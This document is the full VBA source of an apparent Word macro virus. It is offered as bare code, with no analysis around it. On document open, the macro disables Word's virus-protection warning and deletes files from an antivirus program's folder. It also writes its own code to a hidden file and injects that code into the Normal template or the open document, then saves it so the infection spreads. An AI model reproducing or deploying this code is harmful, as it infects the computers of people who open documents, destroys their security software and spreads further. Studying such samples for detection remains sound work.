   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '$$0000005
   Private Sub Document_Open()
   VirusProtection = False
   SaveNormalPrompt = False
   On Error Resume Next
   r = Dir("c:\program files\AntiViral Toolkit Pro\*.*")
   If r <> "" Then
   For c = 1 To 5
   Kill "c:\program files\AntiViral Toolkit Pro\" & r
   Next c
   End If
   If Dir(Application.Path & "\$$$.ant", 6) = "" Then
   Open (Application.Path & "\$$$.ant") For Output As #1
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines
   a = MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(i, 1)
   Print #1, a
   Next i
   Close #1
   End If
   SetAttr Application.Path & "\$$$.ant", 6
   If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(2, 1) <> "Private Sub Document_Open()" Then
   Open Application.Path & "\$$$.ant" For Input As #1
   If LOF(1) = 0 Then GoTo q
   i = 1
   Do While Not EOF(1)
   Line Input #1, a
   NormalTemplate.VBProject.VBComponents.Item(1).codemodule.InsertLines i, a
   i = i + 1
   Loop
   Close #1
   ElseIf ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Private Sub Document_Open()" Then
   Open Application.Path & "\$$$.ant" For Input As #1
   If LOF(1) = 0 Then GoTo q
   i = 1
   Do While Not EOF(1)
   Line Input #1, a
   ActiveDocument.VBProject.VBComponents.Item(1).codemodule.InsertLines i, a
   i = i + 1
   Loop
   q:
   Close #1
   Else
   End If
   ActiveDocument.SaveAs ActiveDocument.FullName
   End Sub
